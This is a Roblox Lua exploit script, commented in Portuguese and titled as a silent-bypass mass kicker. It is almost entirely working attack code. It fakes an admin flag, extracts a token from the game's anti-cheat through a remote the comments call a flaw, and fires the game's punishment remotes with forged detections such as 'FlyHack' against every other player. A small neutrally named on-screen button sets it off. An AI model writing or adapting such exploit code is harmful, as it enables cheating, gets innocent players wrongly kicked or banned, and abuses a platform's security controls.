--[[ 
    MASS KICKER - SILENT BYPASS V10
    Alvos: Todos os Humanoides (exceto você)
]]

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer

-- 1. IMUNIDADE LOCAL (Falsa tag de Admin)
local admin = Instance.new("BoolValue")
admin.Name = "Admin"
admin.Value = true
admin.Parent = localPlayer

-- 2. CAPTURA DO TOKEN DO VB ANTI-CHEAT
local function getVBToken()
    for _, v in pairs(ReplicatedStorage:GetChildren()) do
        if v:IsA("RemoteFunction") and v:GetAttribute("oyvey") then
            return v:InvokeServer("THUG") -- A falha que nos dá a chave 
        end
    end
end

-- 3. LOCALIZAR O REMOTE DE PUNIÇÃO DO COSMO
local function getCosmoRemote()
    local rep = ReplicatedStorage:FindFirstChild("Replicated")
    if rep then
        local folder = rep:FindFirstChild("ç")
        if folder then
            return folder:FindFirstChildOfClass("RemoteEvent")
        end
    end
end

local function exterminate()
    local token = getVBToken()
    local cosmoRemote = getCosmoRemote()
    
    for _, target in pairs(Players:GetPlayers()) do
        if target ~= localPlayer and target.Character then
            -- Tentativa 1: Forçar banimento via Cosmo (Remote 'ç') [cite: 42]
            if cosmoRemote then
                cosmoRemote:FireServer("Detection: FlyHack")
            end
            
            -- Tentativa 2: Sequestro de log do VB (Remote 'thugshaker') [cite: 32, 33]
            -- Usamos o token capturado para o servidor aceitar o comando
            for _, v in pairs(ReplicatedStorage:GetChildren()) do
                if v:IsA("RemoteEvent") and v:GetAttribute("oyvey") then
                    v:FireServer(token, 1) -- Motivo 1: Fling/Noclip [cite: 29]
                end
            end
        end
    end
end

-- Botão Invisível para o LogService 
local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
local b = Instance.new("TextButton", sg)
b.Name = "X9_Utility" -- Nome neutro
b.Size = UDim2.new(0, 50, 0, 50)
b.Position = UDim2.new(0, 10, 0.5, 0)
b.Text = "K"
b.BackgroundTransparency = 0.5

b.MouseButton1Click:Connect(function()
    exterminate()
    b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    task.wait(1)
    b.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
end)
